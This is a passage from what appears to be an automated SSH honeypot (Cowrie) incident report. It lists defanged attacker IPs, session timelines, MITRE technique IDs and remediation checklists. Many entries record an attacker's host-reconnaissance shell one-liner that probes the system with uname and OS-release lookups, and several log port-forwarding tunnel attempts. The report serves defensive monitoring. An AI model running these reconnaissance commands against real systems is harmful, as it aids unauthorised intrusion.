| `2026-08-03 08:38:32` | `cowrie.command.input` |
| `2026-08-03 08:38:32` | `cowrie.log.closed` |
| `2026-08-03 08:38:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bd99f3ed264

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:40 |
| **Last Seen** | 2026-08-03 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:40:31` | `cowrie.session.connect` |
| `2026-08-03 08:40:31` | `cowrie.client.version` |
| `2026-08-03 08:40:31` | `cowrie.client.kex` |
| `2026-08-03 08:40:32` | `cowrie.login.success` |
| `2026-08-03 08:40:33` | `cowrie.session.params` |
| `2026-08-03 08:40:33` | `cowrie.command.input` |
| `2026-08-03 08:40:33` | `cowrie.command.input` |
| `2026-08-03 08:40:33` | `cowrie.command.input` |
| `2026-08-03 08:40:33` | `cowrie.command.input` |
| `2026-08-03 08:40:33` | `cowrie.command.input` |
| `2026-08-03 08:40:33` | `cowrie.command.success` |
| `2026-08-03 08:40:33` | `cowrie.command.input` |
| `2026-08-03 08:40:33` | `cowrie.command.input` |
| `2026-08-03 08:40:33` | `cowrie.command.input` |
| `2026-08-03 08:40:33` | `cowrie.command.input` |
| `2026-08-03 08:40:33` | `cowrie.log.closed` |
| `2026-08-03 08:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23c3d2dc26ec

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:42 |
| **Last Seen** | 2026-08-03 08:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:42:35` | `cowrie.session.connect` |
| `2026-08-03 08:42:35` | `cowrie.client.version` |
| `2026-08-03 08:42:35` | `cowrie.client.kex` |
| `2026-08-03 08:42:36` | `cowrie.login.success` |
| `2026-08-03 08:42:37` | `cowrie.session.params` |
| `2026-08-03 08:42:37` | `cowrie.command.input` |
| `2026-08-03 08:42:37` | `cowrie.command.input` |
| `2026-08-03 08:42:37` | `cowrie.command.input` |
| `2026-08-03 08:42:37` | `cowrie.command.input` |
| `2026-08-03 08:42:37` | `cowrie.command.input` |
| `2026-08-03 08:42:37` | `cowrie.command.success` |
| `2026-08-03 08:42:37` | `cowrie.command.input` |
| `2026-08-03 08:42:37` | `cowrie.command.input` |
| `2026-08-03 08:42:37` | `cowrie.command.input` |
| `2026-08-03 08:42:37` | `cowrie.command.input` |
| `2026-08-03 08:42:37` | `cowrie.log.closed` |
| `2026-08-03 08:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dfef1aef7a0

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-08-03 08:45 |
| **Last Seen** | 2026-08-03 08:50 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:45:01` | `cowrie.session.connect` |
| `2026-08-03 08:45:02` | `cowrie.client.version` |
| `2026-08-03 08:45:02` | `cowrie.client.kex` |
| `2026-08-03 08:45:05` | `cowrie.login.success` |
| `2026-08-03 08:45:06` | `cowrie.direct-tcpip.request` |
| `2026-08-03 08:50:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47c867e9c707

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:45 |
| **Last Seen** | 2026-08-03 08:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:45:10` | `cowrie.session.connect` |
| `2026-08-03 08:45:10` | `cowrie.client.version` |
| `2026-08-03 08:45:10` | `cowrie.client.kex` |
| `2026-08-03 08:45:10` | `cowrie.login.success` |
| `2026-08-03 08:45:11` | `cowrie.session.params` |
| `2026-08-03 08:45:11` | `cowrie.command.input` |
| `2026-08-03 08:45:11` | `cowrie.command.input` |
| `2026-08-03 08:45:11` | `cowrie.command.input` |
| `2026-08-03 08:45:11` | `cowrie.command.input` |
| `2026-08-03 08:45:11` | `cowrie.command.input` |
| `2026-08-03 08:45:11` | `cowrie.command.success` |
| `2026-08-03 08:45:11` | `cowrie.command.input` |
| `2026-08-03 08:45:11` | `cowrie.command.input` |
| `2026-08-03 08:45:11` | `cowrie.command.input` |
| `2026-08-03 08:45:11` | `cowrie.command.input` |
| `2026-08-03 08:45:11` | `cowrie.log.closed` |
| `2026-08-03 08:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecfd7defdd4f

| Field | Detail |
|---|---|
| **Source IP** | `95.87.248[.]223` |
| **First Seen** | 2026-08-03 08:45 |
| **Last Seen** | 2026-08-03 08:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:45:13` | `cowrie.session.connect` |
| `2026-08-03 08:45:15` | `cowrie.client.version` |
| `2026-08-03 08:45:15` | `cowrie.client.kex` |
| `2026-08-03 08:45:17` | `cowrie.login.success` |
| `2026-08-03 08:45:17` | `cowrie.direct-tcpip.request` |
| `2026-08-03 08:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.87.248[.]223` to AbuseIPDB if not already reported
- [ ] Block `95.87.248[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e1446027023

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:48 |
| **Last Seen** | 2026-08-03 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:48:17` | `cowrie.session.connect` |
| `2026-08-03 08:48:17` | `cowrie.client.version` |
| `2026-08-03 08:48:17` | `cowrie.client.kex` |
| `2026-08-03 08:48:18` | `cowrie.login.success` |
| `2026-08-03 08:48:19` | `cowrie.session.params` |
| `2026-08-03 08:48:19` | `cowrie.command.input` |
| `2026-08-03 08:48:19` | `cowrie.command.input` |
| `2026-08-03 08:48:19` | `cowrie.command.input` |
| `2026-08-03 08:48:19` | `cowrie.command.input` |
| `2026-08-03 08:48:19` | `cowrie.command.input` |
| `2026-08-03 08:48:19` | `cowrie.command.success` |
| `2026-08-03 08:48:19` | `cowrie.command.input` |
| `2026-08-03 08:48:19` | `cowrie.command.input` |
| `2026-08-03 08:48:19` | `cowrie.command.input` |
| `2026-08-03 08:48:19` | `cowrie.command.input` |
| `2026-08-03 08:48:19` | `cowrie.log.closed` |
| `2026-08-03 08:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd798dd774ae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 08:50 |
| **Last Seen** | 2026-08-03 08:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:50:06` | `cowrie.session.connect` |
| `2026-08-03 08:50:06` | `cowrie.client.version` |
| `2026-08-03 08:50:06` | `cowrie.client.kex` |
| `2026-08-03 08:50:07` | `cowrie.login.success` |
| `2026-08-03 08:50:08` | `cowrie.session.params` |
| `2026-08-03 08:50:08` | `cowrie.command.input` |
| `2026-08-03 08:50:08` | `cowrie.command.input` |
| `2026-08-03 08:50:08` | `cowrie.command.input` |
| `2026-08-03 08:50:08` | `cowrie.command.input` |
| `2026-08-03 08:50:08` | `cowrie.command.input` |
| `2026-08-03 08:50:08` | `cowrie.command.success` |
| `2026-08-03 08:50:08` | `cowrie.command.input` |
| `2026-08-03 08:50:08` | `cowrie.command.input` |
| `2026-08-03 08:50:08` | `cowrie.command.input` |
| `2026-08-03 08:50:08` | `cowrie.command.input` |
| `2026-08-03 08:50:09` | `cowrie.log.closed` |
| `2026-08-03 08:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3902d8ab9fe4

| Field | Detail |
|---|---|
| **Source IP** | `45.156.128[.]56` |
| **First Seen** | 2026-08-03 08:50 |
| **Last Seen** | 2026-08-03 08:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.86 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:50:39` | `cowrie.session.connect` |
| `2026-08-03 08:50:39` | `cowrie.login.success` |
| `2026-08-03 08:50:40` | `cowrie.session.params` |
| `2026-08-03 08:50:40` | `cowrie.command.input` |
| `2026-08-03 08:50:40` | `cowrie.command.input` |
| `2026-08-03 08:50:40` | `cowrie.command.failed` |
| `2026-08-03 08:50:40` | `cowrie.command.input` |
| `2026-08-03 08:50:40` | `cowrie.command.failed` |
| `2026-08-03 08:50:40` | `cowrie.command.input` |
| `2026-08-03 08:50:40` | `cowrie.log.closed` |
| `2026-08-03 08:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.128[.]56` to AbuseIPDB if not already reported
- [ ] Block `45.156.128[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81247bf873d3

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-08-03 08:50 |
| **Last Seen** | 2026-08-03 08:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:50:47` | `cowrie.session.connect` |
| `2026-08-03 08:50:47` | `cowrie.client.version` |
| `2026-08-03 08:50:47` | `cowrie.client.kex` |
| `2026-08-03 08:50:48` | `cowrie.login.success` |
| `2026-08-03 08:50:48` | `cowrie.direct-tcpip.request` |
| `2026-08-03 08:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afe8c1a5be26

| Field | Detail |
|---|---|
| **Source IP** | `50.217.255[.]171` |
| **First Seen** | 2026-08-03 08:50 |
| **Last Seen** | 2026-08-03 08:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 08:50:52` | `cowrie.session.connect` |
| `2026-08-03 08:50:53` | `cowrie.client.version` |
| `2026-08-03 08:50:53` | `cowrie.client.kex` |
| `2026-08-03 08:50:54` | `cowrie.login.success` |
| `2026-08-03 08:50:54` | `cowrie.direct-tcpip.request` |
| `2026-08-03 08:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.255[.]171` to AbuseIPDB if not already reported
- [ ] Block `50.217.255[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1bb45e8e5b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-03 09:05 |
| **Last Seen** | 2026-08-03 09:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:05:08` | `cowrie.session.connect` |
| `2026-08-03 09:05:08` | `cowrie.client.version` |
| `2026-08-03 09:05:08` | `cowrie.client.kex` |
| `2026-08-03 09:05:09` | `cowrie.login.success` |
| `2026-08-03 09:05:09` | `cowrie.direct-tcpip.request` |
| `2026-08-03 09:05:09` | `cowrie.direct-tcpip.data` |
| `2026-08-03 09:05:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd111e1aabbf

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-03 09:14 |
| **Last Seen** | 2026-08-03 09:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:14:26` | `cowrie.session.connect` |
| `2026-08-03 09:14:27` | `cowrie.client.version` |
| `2026-08-03 09:14:27` | `cowrie.client.kex` |
| `2026-08-03 09:14:29` | `cowrie.login.success` |
| `2026-08-03 09:14:29` | `cowrie.direct-tcpip.request` |
| `2026-08-03 09:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63dbabd0905f

| Field | Detail |
|---|---|
| **Source IP** | `138.118.213[.]68` |
| **First Seen** | 2026-08-03 09:19 |
| **Last Seen** | 2026-08-03 09:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:19:54` | `cowrie.session.connect` |
| `2026-08-03 09:19:55` | `cowrie.client.version` |
| `2026-08-03 09:19:55` | `cowrie.client.kex` |
| `2026-08-03 09:19:57` | `cowrie.login.success` |
| `2026-08-03 09:19:58` | `cowrie.direct-tcpip.request` |
| `2026-08-03 09:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.118.213[.]68` to AbuseIPDB if not already reported
- [ ] Block `138.118.213[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03104b9e9505

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 09:33 |
| **Last Seen** | 2026-08-03 09:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:33:30` | `cowrie.session.connect` |
| `2026-08-03 09:33:30` | `cowrie.client.version` |
| `2026-08-03 09:33:30` | `cowrie.client.kex` |
| `2026-08-03 09:33:32` | `cowrie.login.success` |
| `2026-08-03 09:33:33` | `cowrie.session.params` |
| `2026-08-03 09:33:33` | `cowrie.command.input` |
| `2026-08-03 09:33:33` | `cowrie.command.input` |
| `2026-08-03 09:33:33` | `cowrie.command.input` |
| `2026-08-03 09:33:33` | `cowrie.command.input` |
| `2026-08-03 09:33:33` | `cowrie.command.input` |
| `2026-08-03 09:33:33` | `cowrie.command.success` |
| `2026-08-03 09:33:33` | `cowrie.command.input` |
| `2026-08-03 09:33:33` | `cowrie.command.input` |
| `2026-08-03 09:33:33` | `cowrie.command.input` |
| `2026-08-03 09:33:33` | `cowrie.command.input` |
| `2026-08-03 09:33:34` | `cowrie.log.closed` |
| `2026-08-03 09:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-570b909aa22e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 09:35 |
| **Last Seen** | 2026-08-03 09:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:35:48` | `cowrie.session.connect` |
| `2026-08-03 09:35:48` | `cowrie.client.version` |
| `2026-08-03 09:35:48` | `cowrie.client.kex` |
| `2026-08-03 09:35:49` | `cowrie.login.success` |
| `2026-08-03 09:35:50` | `cowrie.session.params` |
| `2026-08-03 09:35:50` | `cowrie.command.input` |
| `2026-08-03 09:35:50` | `cowrie.command.input` |
| `2026-08-03 09:35:50` | `cowrie.command.input` |
| `2026-08-03 09:35:50` | `cowrie.command.input` |
| `2026-08-03 09:35:50` | `cowrie.command.input` |
| `2026-08-03 09:35:50` | `cowrie.command.success` |
| `2026-08-03 09:35:50` | `cowrie.command.input` |
| `2026-08-03 09:35:50` | `cowrie.command.input` |
| `2026-08-03 09:35:50` | `cowrie.command.input` |
| `2026-08-03 09:35:50` | `cowrie.command.input` |
| `2026-08-03 09:35:50` | `cowrie.log.closed` |
| `2026-08-03 09:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81bab98daa71

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-03 09:36 |
| **Last Seen** | 2026-08-03 09:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:36:13` | `cowrie.session.connect` |
| `2026-08-03 09:36:13` | `cowrie.client.version` |
| `2026-08-03 09:36:13` | `cowrie.client.kex` |
| `2026-08-03 09:36:14` | `cowrie.login.success` |
| `2026-08-03 09:36:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-086907d1301d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-03 09:36 |
| **Last Seen** | 2026-08-03 09:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 09:36:13` | `cowrie.session.connect` |
| `2026-08-03 09:36:13` | `cowrie.client.version` |
| `2026-08-03 09:36:13` | `cowrie.client.kex` |
| `2026-08-03 09:36:14` | `cowrie.login.success` |
| `2026-08-03 09:36:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a2d4180810

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 09:38 |
| **Last Seen** | 2026-08-03 09:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
